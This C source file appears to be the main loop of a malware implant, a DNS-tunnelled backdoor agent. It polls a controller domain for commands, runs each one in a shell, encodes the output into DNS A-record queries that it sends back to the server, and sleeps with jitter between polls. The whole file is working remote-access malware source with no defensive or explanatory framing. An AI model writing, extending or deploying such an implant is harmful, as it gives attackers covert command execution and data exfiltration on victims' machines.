#include <stdlib.h>
#include <time.h>

#include "util/debug.h"
#include "client.h"
#include "options.h"
#include "util/utils.h"

void implant() {

    struct Client *client = init_client();
    Dprintf("[d] booting agent for %s\n", client->domain);
    Dprintf("[d] agent jitter is: %d\n", MAX_SLEEP);

    while (poll(client)) {

        switch (client->status) {
            case Idle:
                break;

            case Command:
                Dprintf("[d] we have the '%s' command to execute!\n", client->command);
                char *output = shell_exec_output(client->command);
                Dprintf("[d] command output:\n\n%s\n", output);

                int response_bytes_len = 0;
                char *response_bytes = str_to_response_bytes(client, output, &response_bytes_len);

                int req_len = 0;
                char **req = payload_to_dns_a(response_bytes, response_bytes_len, &req_len);
                int status = send_response(client, req, req_len);
                if (status != 0) {
                    Dprintf("[d] server failed to accepted our response data\n");
                }

                free(client->command);
                free(output);
                free(response_bytes);
                free(req);

                client->status = Idle;
                break;

            case Error:
                Dprintf("[e] the server indicated an error occurred, resetting");
                client->status = Idle;
                break;

            default:
                Dprintf("[e] something is wrong, client reached an unknown status");
                break;
        }

        jitter_sleep();
    }
}

int main() {

    srand(time(NULL) * 1);
    implant();

    return 0;
}
